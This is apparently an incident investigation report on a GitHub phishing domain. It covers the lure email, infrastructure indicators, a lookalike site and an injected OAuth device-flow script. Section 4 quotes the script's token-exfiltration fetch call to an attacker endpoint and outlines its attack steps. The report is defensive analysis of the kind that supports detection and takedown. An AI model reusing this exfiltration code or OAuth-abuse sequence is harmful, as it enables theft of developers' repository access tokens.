# `my-github.com` Phishing Investigation

**Investigation date:** October 10, 2026  
**Reported GitHub Support ticket:** #4844052  
**Assessment:** Strong evidence of GitHub impersonation and attempted OAuth token exfiltration; successful credential theft and takedown status unconfirmed.

## Executive summary

An email posing as a GitHub sign-in security alert linked to `https://my-github.com/SDRVuhYw`. Examination of captured site HTML revealed a GitHub lookalike with rewritten asset and API domains, plus JavaScript attempting to initiate a GitHub OAuth device authorization, approve it, poll for an access token, and transmit the token to `https://my-github.com:8443/t`.

Later, a captured HTTP response from `https://my-github.com/login` contained a JavaScript redirect to genuine `https://github.com`, explaining why the browser appeared to land on the official site. The observed redirect does **not** clear the earlier phishing evidence.

No evidence establishes that the OAuth attack completed, that a real GitHub account was compromised, who operated the site, or that the domain was officially taken down.

## 1. Initial phishing email

The message claimed a new GitHub sign-in from Moscow, Russia and urged the recipient to secure the account using a link on the lookalike domain.

| Item | Value in email |
|---|---|
| Account username | `km7bnv` (reportedly changed about a week earlier) |
| Claimed location | Moscow, Russia |
| Claimed IP | `95.199.84.125` |
| Claimed device | Chrome 131 / Windows 10 |
| Claimed time | October 10, 2026, 14:27 UTC |
| Linked URL | `https://my-github.com/SDRVuhYw` |

The email used a genuine GitHub-hosted logo. Neither its branding nor its claims prove a real login occurred. The destination was not an official GitHub domain.

## 2. Infrastructure evidence

| Indicator | Observed value |
|---|---|
| Suspect domain | `my-github.com` |
| Remote IP in browser network capture | `193.32.204.199:443` |
| TLS certificate subject | `my-github.com` |
| TLS certificate issuer | Let's Encrypt, intermediate `YE1` |
| Certificate issuance | October 9, 2026 |

An earlier public-security report linked this IP to GhostAction-related infrastructure; this remains an **attributed association**, not proof that the domain operator was responsible for that campaign.

HTTPS and a valid domain-validation certificate do not establish that a site is trustworthy.

## 3. Fake GitHub homepage

The earlier saved homepage resembled GitHub's official marketing page, including React components, CSS, logos, and navigation. But configuration values were rewritten to the lookalike domain:

```json
{
  "githubDomain": "https://my-github.com",
  "cmcApiUrl": "https://api.my-github.com/cmc_internal/api"
}
```

Other referenced hosts included:

- `github.my-github.com` — JavaScript and CSS assets
- `api.my-github.com` — API references
- `collector.my-github.com` — analytics endpoint
- `docs.my-github.com` — documentation references

The captured homepage had ordinary signup forms but no visible password input on that page. This does **not** determine what earlier versions of `/login` might have shown.

## 4. Injected OAuth token-exfiltration attempt

A suspicious inline script near the end of the saved homepage, also observed in the CAPTCHA-page capture, attempted this sequence:

1. Check for a GitHub-style signed-in user avatar.
2. Request a device authorization using OAuth client ID `Ov23ctrqCqZ79UaYKwyq` and scopes `repo`, `workflow`, and `read:org`.
3. Fetch device-verification pages and attempt to extract and submit HTML forms.
4. Poll `/login/oauth/access_token` for an access token.
5. If a token was returned, send it to an endpoint on the suspicious domain.

**Critical code excerpt:**

```js
fetch(
  "https://my-github.com:8443/t?value=" +
  td.access_token +
  "&user=" +
  encodeURIComponent(vu),
  { mode: "no-cors" }
);
```

This is direct evidence of **attempted token exfiltration**. It is not evidence that an access token was actually obtained or transmitted.

### Requested OAuth scopes

| Scope | Potential permission |
|---|---|
| `repo` | Repository access, including private repositories |
| `workflow` | Permissions relating to GitHub Actions workflow files |
| `read:org` | Read organization information |

### Code weaknesses and uncertainty

- One path refers to `flowStart` outside the scope of the named function expression, likely causing a `ReferenceError` if the avatar appears only after the initial check.
- The OAuth endpoint requests are relative paths (e.g. `/login/device/code`) and, in a browser on `my-github.com`, target that origin unless server-side proxying is involved.
- The original captured homepage was logged out and did not initially expose the matching user-avatar element.
- Form parsing uses regular expressions dependent on exact HTML structure.
- A local-storage flag, `__vh_oauth`, is set before completion and may prevent subsequent attempts in the same origin.

These weaknesses limit claims about whether the attempt would succeed. Reverse-proxy functionality was **not independently verified**.

## 5. CAPTCHA and anti-bot page

A temporary restriction screen claimed unusual activity, displayed an IP and feedback ID, and mentioned automation and developer tools. The displayed values appeared hardcoded in inspected HTML, but the page also contained DataDome integration:

```html
<script src="https://ct.captcha-delivery.com/c.js"></script>
```

It also included an iframe referencing `geo.captcha-delivery.com`. Consequently, static-looking IP/feedback text does not prove that the whole anti-bot challenge was fake. Suspicious OAuth code was observed alongside the CAPTCHA integration.

## 6. Browser network capture and redirect

A network request recorded in browser DevTools showed:

```http
GET https://my-github.com/login
Status: 200 OK
Remote Address: 193.32.204.199:443
Content-Type: text/html
Cache-Control: no-cache, no-store
```

The **response body** was:

```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
    <script>
      top.location.href = 'https://github.com';
    </script>
  </head>
  <body></body>
</html>
```

This shows a **client-side JavaScript redirect**, not an HTTP 3xx response. The `no-referrer` meta directive instructs the browser not to pass ordinary referrer information to the destination.

That explains the sequence of a `my-github.com` document request followed by authentic `github.com` and `github.githubassets.com` requests. It does **not** prove the phishing site was disabled, that it was cloaking visitors, or that a provider took it down.

**Evidence-handling caution:** The DevTools request originally pasted into the conversation included a full `_gh_sess` cookie value. That capture should not be shared publicly without redacting cookies, authorization headers, tokens, and other secrets. A cookie sent to `my-github.com` is not automatically a genuine `github.com` session cookie; browsers normally isolate cookies by domain.

## 7. Other reviewed material

| Material | Assessment |
|---|---|
| `util.js` | A Zod-style `allowsEval` compatibility check attempted `new Function("")`; the browser's CSP blocked it. This is not, by itself, malicious. |
| `s2x-8a6b102e5f8c3fa4.js` | A GitHub-style marketing/banner React bundle; no matching OAuth-exfiltration code observed. |
| Later official GitHub HTML capture | Referenced `github.com`, `api.github.com`, and `github.githubassets.com`, without the previously identified malicious payload. |
| Saved-website ZIP | Earlier review described GitHub homepage assets and no matching token-exfiltration indicators in that snapshot. |
| Earlier fake homepage and CAPTCHA HTML | Both contained suspicious OAuth code. |

The absence of known indicators in a later capture does not invalidate earlier evidence or prove every external dependency is harmless.

## 8. Reporting and account risk

A message from `support@githubsupport.com` acknowledged a support request with ticket ID **4844052**. That is consistent with an official GitHub Support acknowledgment, but the message by itself is not proof of a completed investigation or takedown. The ticket can be checked directly at `https://support.github.com/`.

The conversation included a statement that credentials had been entered on the phishing page, followed by joking suggesting that claim might not have been literal. Whether real credentials were exposed was never established. **If an actual GitHub password was entered**, change it on `https://github.com`, review sessions and the security log, and revoke any unauthorized apps or access tokens. Review other services if that password was reused.

## 9. Evidence confidence table

| Conclusion | Status |
|---|---|
| A fake GitHub security alert linked to `my-github.com` | Confirmed from provided email |
| A GitHub-lookalike homepage was captured | Confirmed from provided HTML |
| An attempted OAuth token-exfiltration script was present | Confirmed from provided HTML |
| A request to `193.32.204.199:443` was recorded | Confirmed from provided DevTools details |
| `/login` returned HTML redirecting to actual `github.com` | Confirmed from provided response |
| A genuine GitHub token was successfully stolen | **Not established** |
| A real account was compromised | **Not established** |
| The site operated as a functional GitHub reverse proxy | **Not established** |
| GhostAction operators controlled this domain | **Not established** |
| GitHub or the hosting provider took down the site | **Not established** |
| Visiting the site installed malware on the user's computer | **No evidence established** |

## Final assessment

`my-github.com` served GitHub-impersonation content containing JavaScript designed to obtain and exfiltrate OAuth credentials. A subsequent `/login` response instructed browsers to navigate to genuine GitHub, accounting for the apparently legitimate final destination.

**Most important preserved artifacts for GitHub Support:**

1. Original phishing email and its `my-github.com/SDRVuhYw` destination.
2. Original malicious homepage HTML with inline OAuth and exfiltration script.
3. CAPTCHA-page capture containing the suspicious code.
4. Browser request metadata and sanitized `/login` response showing the client-side redirect.

The evidence supports a phishing and token-theft **attempt**, not verified token theft, account compromise, or campaign takedown.
